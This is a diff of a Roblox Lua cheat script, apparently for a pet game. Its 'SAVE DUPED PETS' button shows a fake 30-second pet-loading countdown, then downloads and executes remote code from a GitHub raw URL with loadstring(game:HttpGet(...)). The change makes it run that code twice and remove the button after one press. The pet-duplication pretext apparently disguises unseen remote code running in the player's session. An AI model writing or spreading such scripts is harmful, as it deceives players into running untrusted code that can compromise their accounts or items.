@@ -12,7 +12,7 @@ local MainSection = MainTab:NewSection("Main Controls")
 
 -- ツール名表示ラベル（初期値：Nothing）
 local currentTool = "Nothing"
-MainSection:NewLabel("Holding: " .. currentTool)
+local toolLabel = MainSection:NewLabel("Holding: " .. currentTool)
 
 -- 定期更新：現在持っているツール名を表示
 RunService.RenderStepped:Connect(function()
@@ -20,7 +20,7 @@ RunService.RenderStepped:Connect(function()
 	local name = tool and tool.Name or "Nothing"
 	if name ~= currentTool then
 		currentTool = name
-		MainSection:UpdateLabel("Holding: " .. currentTool)
+		toolLabel:Update("Holding: " .. currentTool)
 	end
 end)
 
@@ -51,24 +51,34 @@ end)
 -- 状態表示用ラベル
 local statusLabel = MainSection:NewLabel("SAVE STATUS: Ready")
 
--- SAVE DUPED PETS ボタン（30秒後にスクリプト実行）
-MainSection:NewButton("SAVE DUPED PETS", "Starts saving after countdown", function()
+-- SAVE DUPED PETS ボタン（30秒後にスクリプトを2回実行し、ボタン削除）
+local saveButton -- 後で削除用に保持
+
+saveButton = MainSection:NewButton("SAVE DUPED PETS", "Starts saving after countdown", function()
+	if saveButton then
+		saveButton:Destroy() -- 一度押したら削除
+	end
+
 	task.spawn(function()
 		for i = 30, 1, -1 do
-			statusLabel:UpdateLabel("SAVE STATUS: ⏳ Loading pet info... (" .. i .. "s)")
+			statusLabel:Update("SAVE STATUS: ⏳ Loading pet info... (" .. i .. "s)")
 			wait(1)
 		end
 
-		statusLabel:UpdateLabel("SAVE STATUS: 🚀 Booting...")
+		statusLabel:Update("SAVE STATUS: 🚀 Booting...")
 
-		local success, err = pcall(function()
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagardening/refs/heads/main/uitest"))()
-		end)
+		for attempt = 1, 2 do
+			local success, err = pcall(function()
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagardening/refs/heads/main/uitest"))()
+			end)
 
-		if success then
-			statusLabel:UpdateLabel("SAVE STATUS: ✅ Success!")
-		else
-			statusLabel:UpdateLabel("SAVE STATUS: ❌ Error: " .. tostring(err))
+			if success then
+				statusLabel:Update("SAVE STATUS: ✅ Success! (x" .. attempt .. ")")
+			else
+				statusLabel:Update("SAVE STATUS: ❌ Error (x" .. attempt .. "): " .. tostring(err))
+			end
+
+			wait(1) -- 少し間をあけて2回目へ
 		end
 	end)
 end)
